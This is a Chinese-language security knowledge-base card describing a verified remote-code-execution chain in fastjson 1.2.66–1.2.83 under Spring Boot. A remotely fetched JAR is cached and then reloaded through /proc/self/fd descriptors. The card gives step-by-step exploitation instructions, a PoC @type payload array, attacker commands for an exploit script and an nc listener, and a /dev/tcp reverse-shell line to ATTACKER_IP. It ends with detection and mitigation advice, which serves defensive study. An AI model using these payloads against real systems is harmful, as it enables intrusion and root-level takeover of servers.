---
id: web-java-deser-fastjson-jar-cache-fd-reload-rce
title: fastjson 1.2.83 用 jar:http 种子拉取触发 /tmp/jar_cache fd 二次加载 RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-jar-http-seed-jar-cache-fd-reload
aliases:
- fastjson 1.2.83 fd 枚举
- fastjson jar_cache fd
- /tmp/jar_cache 文件描述符
- jar:http 种子 + jar:file fd
- fastjson JDK17 RCE
- fastjson JDK21 RCE
- JSONType 注解 fd 二次加载
- LaunchedURLClassLoader jar cache
tags:
- java
- fastjson
- deserialization
- autotype
- json-type
- jar
- proc-fd
- jar-cache
- classloader
- spring-boot
- rce
- jdk17
- jdk21
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: fastjson 1.2.66 ~ 1.2.83（≤1.2.65 与 ≥1.2.84 不受影响；fastjson2 不受影响）
verification:
  verified_by: verifier-V29
  verified_at: '2026-11-05T03:15:48+08:00'
  notes: 已通读全文并逐张查看28张图。核对：checkAutoType 中 typeName.replace('.','/')+'.class' → defaultClassLoader.getResourceAsStream → ClassReader/TypeCollector 扫 @JSONType → autoTypeSupport||jsonType||expectClassFlag → TypeUtils.loadClass → <clinit>；img01 作者 Kirill Firsove 推文、img02-09 源码、img10-15 JDK8 jdk8-http 直接 RCE（nc 收到 root）、img16-22 JDK17 fd 模式（jarCacheFds 14/16 指向 /tmp/jar_cache...tmp，img20 报 jar:file:...cannot be cast 证明类已被加载）、img23-25 JDK21、img26-28 JDK25 均 root shell，与卡一致。影响版本 1.2.66~1.2.83 与表格一致。未验证点：PoC 未在本机执行；原文无 CVE 编号，cve 留空正确；frontmatter 无 sources/source_url（来源 xz.aliyun.com/news/92583）。
---

## 一句话结论

在 Spring Boot FatJar（`LaunchedURLClassLoader`）+ fastjson 1.2.66~1.2.83、`autoType=false`、`SafeMode=false` 的环境中，先让 fastjson 以 `jar:http://attacker/...` 从攻击者处拉取一个 JAR，JVM 会把它缓存成 `/tmp/jar_cache*.tmp` 并保持打开的文件描述符；随后用 `jar:file:/proc/self/fd/N!/...` 枚举这些 fd，加载 JAR 中带 `@JSONType` 与 `<clinit>` 的类，即可在目标进程执行任意命令。JDK 17/21/25 均已实测拿到反连 shell；JDK 8 可直接走 `jar:http` 短链（另有既有卡覆盖）。

## 原理

- `checkAutoType` 在 SafeMode 关闭后，先把 `@type` 值做 `typeName.replace('.', '/') + ".class"`，再调用 `defaultClassLoader.getResourceAsStream(resource)` 探测资源。
- Spring Boot 的 `LaunchedURLClassLoader` 能解析 `jar:` URL。把 `@type` 写成 `jar:http:..<十进制IP>:<端口>.<jar名>!.foo.<类名>`（点号会在探测时被换成斜杠，还原成 `jar:http://IP:port/jar名!/foo/类名`），fastjson 就会向攻击者 HTTP 拉取 JAR。
- 拉取后 JVM 把 JAR 缓存到 `/tmp/jar_cache<随机>.tmp`，并在进程内保留打开的 fd；实验靶场的 `/health` 日志可直接看到 `jarCacheFds`（如 `14->/tmp/jar_cache73887792756360823.tmp`）。
- 现代 JDK（17/21/25）不能像 JDK 8 那样直接 `defineClass` 这个 URL 形式的类名；攻击者改用第二阶段：`jar:file:.proc.self.fd.N!.fdN.<类名>`，点号还原后指向 `/proc/self/fd/N`（即缓存的 JAR），从中加载 JAR 内预先放好的恶意类。
- fastjson 的 `ClassReader` 扫描到恶意类带 `Lcom/alibaba/fastjson/annotation/JSONType;`，置 `jsonType=true`；后续判断 `autoTypeSupport || jsonType || expectClassFlag` 成立，即使 `autoTypeSupport=false` 也会调用 `TypeUtils.loadClass(...)`。
- 类被加载并初始化时执行 `<clinit>`，攻击者把 `Runtime.exec` 或反连命令放在静态块中，得到 RCE。
- **信任逻辑倒置**：攻击者既控制被检测的字节码，也控制用于通过检测的 `@JSONType` 标记；`@JSONType` 只是功能注解，却被当作安全授权凭证。
- **类型绑定不防**：目标即使使用 `JSON.parseObject(body, Dto.class)` 绑定到无害 DTO，`checkAutoType` 对 `@type` 的资源探测仍会发生，静态块仍会执行；不要以为“指定了 DTO”就安全。

## 触发条件

- fastjson 1.2.66 ~ 1.2.83，`SafeMode=false`（默认）；`autoType=false` 不构成防护。
- 默认 ClassLoader（或 TCCL）为 Spring Boot FatJar 的 `LaunchedURLClassLoader`，能解析 `jar:http` / `jar:file`。
- 应用把不可信 JSON 交给 fastjson 解析，包括 `parse`、`parseObject`，以及绑定具体 DTO 的 `parseObject(body, Xxx.class)`。
- 目标可出网访问攻击者的 HTTP 服务（第一阶段拉 JAR）；Linux 且存在 `/proc/self/fd`。
- JDK 17/21/25 走 fd 模式；JDK 8 可走 `jar:http` 短链，不需要 fd。
- 类只会被定义和初始化一次，同一 JVM 第二次攻击是缓存命中、不再执行 `<clinit>`；复现需重启靶机或换唯一类名/tag。
- 系统属性 `-Dfastjson.parser.safeMode=true` 可在资源探测之前阻断；升级到 1.2.84 修复。

## 利用步骤

1. 确认 fastjson 版本、`SafeMode` 状态、部署形态（FatJar / `LaunchedURLClassLoader`）与解析入口。
2. 生成恶意 JAR：一个 seed 类（`foo/Tt<tag>Exception`，不带 `@JSONType`、不执行命令，只负责打开远程 JAR 留下缓存 fd），以及 `fd3/...` 到 `fd256/...` 共 254 个恶意类；每个恶意类的内部名写成 `jar:file:/proc/self/fd/N!/fdN/Tt<tag>Exception`，带 `@JSONType` 注解，`<clinit>` 执行反连命令。IP 用十进制整数表示，避免 `replace('.', '/')` 破坏。
3. 把 JAR 以无后缀文件名放到攻击者 HTTP 根目录（例如 `probe_<tag>`），启动 HTTP 服务。
4. 先发一次首阶段请求：`{"@type":"jar:http:..<int-ip>:<port>.probe_<tag>!.foo.Tt<tag>Exception"}`，让目标拉取 JAR 并留下 `/tmp/jar_cache*.tmp` 的 fd。
5. 再发一个数组，包含首阶段 `jar:http` 项 + `jar:file:.proc.self.fd.3!.fd3.Tt<tag>Exception` 到 `fd.256` 的全部项；fastjson 逐个处理 `@type`，命中的 fd 会打开缓存 JAR 并加载对应恶意类。
6. 观察攻击者 HTTP 收到 JAR/类请求、目标日志出现异常类名、反连监听收到 shell；若未命中，扩大 fd 范围或重启后换 tag 重试。
7. 用 `pwd`、`id`、`uname -a` 验证命令执行上下文（实验为容器内 root）。

## PoC

```json
[
  {"@type":"jar:http:..3587177930:8080.probe_t1784975521_fd!.foo.Tt1784975521_fdException"},
  {"@type":"jar:file:.proc.self.fd.3!.fd3.Tt1784975521_fdException"},
  {"@type":"jar:file:.proc.self.fd.4!.fd4.Tt1784975521_fdException"},
  {"@type":"jar:file:.proc.self.fd.5!.fd5.Tt1784975521_fdException"}
]
```

```text
说明：
- 数组需覆盖 fd 3..256（共 255 项）；上面只示意前几项。
- 首项 jar:http 负责把攻击者 JAR 下载到目标 /tmp/jar_cache*.tmp 并保持 fd。
- 后续 jar:file:.proc.self.fd.N 负责从该缓存 fd 加载 JAR 内的恶意类。
- 主机写成十进制整数（如 127.0.0.1 -> 2130706433），否则点号会被替换成斜杠。
- 类名、jar 名带唯一 tag，避免同一 JVM 类缓存导致 <clinit> 不重复执行。
```

```bash
# 攻击侧（示意，替换为实际靶场与监听地址）
python3 exploit_fd.py ATTACKER_IP 8080 http://TARGET:8080 /parse --mode fd --tag t1784975521_fd
nc -lvnp 2333
# 恶意类 <clinit> 内执行：/bin/sh -i >& /dev/tcp/ATTACKER_IP/2333 0>&1
```

```text
实验记录（JDK 17.0.19 / 21.0.11 / 25.0.3）：
- /parse 返回 ok:false + JSONException 属正常，恶意类已在 loadClass 阶段执行；
- 目标日志 jarCacheFds 显示 /tmp/jar_cache*.tmp 的 fd；
- 攻击机 nc 收到连接，id 为 uid=0(root)。
```

## 变体与关联

- 变体（批量模板）：`{"@type":"jar:file:.proc.self.fd.{{int::fd(3-256)}}!.fd{{int::fd(3-256)}}.Tt<tag>Exception"}` 由工具批量生成 3–256 的 fd 碰撞项。
- 变体（JDK 8 短链）：`{"@type":"http:..<int-ip>:<port>.<类名>"}` 直接拉取单个 class 并执行，不需要 fd；属于既有资源探测 RCE 卡的覆盖范围。
- 变体（fd 来源不同）：Tomcat multipart 临时文件 + `jar:file:.proc.self.fd.N` 是另一条 fd 获取路径，要求上传接口且不出网；本卡依赖 `jar:http` 拉取后的 JAR 缓存 fd，需要第一阶段出网。
- 关联：[[web-java-deser-fastjson-resource-probing-rce]]（同一条 `checkAutoType` 资源探测 + `@JSONType` 自证信任链，网络短链版）、[[web-java-deser-fastjson-fd-jar-no-egress-rce]]（multipart 临时文件 fd 的不出网变体）、[[web-java-deser-fastjson-file-protocol-no-egress-rce]]（预落盘 class 的 `file:` 变体）。
- 边界：`SafeMode=true` 在探测前阻断；升级 1.2.84 后 `hasIllegalTypeNameChars` 会在资源探测前拒绝含 `:` 或 `!` 的类型名；目标不能出网时首阶段失败；非 Linux 无 `/proc/self/fd`；类只初始化一次，重放需重启或换类名。

## 检测与防御

- 请求检测：JSON 中出现 `@type`，值为 `jar:`、`http:`、`file:`、`/proc/self/fd`、十进制 IP、`!` 或异常点号编码；同一数组内出现大量 `@type`，且先 `jar:http` 后 `jar:file:.proc.self.fd.N` 的组合。
- 主机检测：进程打开 `/tmp/jar_cache*.tmp` 并长期保持 fd；进程访问 `/proc/self/fd/*`；应用日志出现 `jar:file:.proc.self.fd` 类名或 `ClassCastException` 中包含 URL 形式类名。
- 网络检测：应用进程对陌生外部地址发起 HTTP GET 拉取无后缀 JAR；同一时间窗内出现大量短连接 JSON 请求。
- 修复：升级到 fastjson 1.2.84+ 或迁移 fastjson2；开启 `-Dfastjson.parser.safeMode=true`（检查早于资源探测）；生产环境不要开启 autoType。
- 加固：解析入口加类型白名单（`ParserConfig.addAccept`），拒绝 `@type` 含 `:`/`!`/`/`；限制应用出网；用 RASP 监控 `getResourceAsStream`、`TypeUtils.loadClass`、`/proc/self/fd` 访问；容器内以非 root 运行并限制临时目录权限。
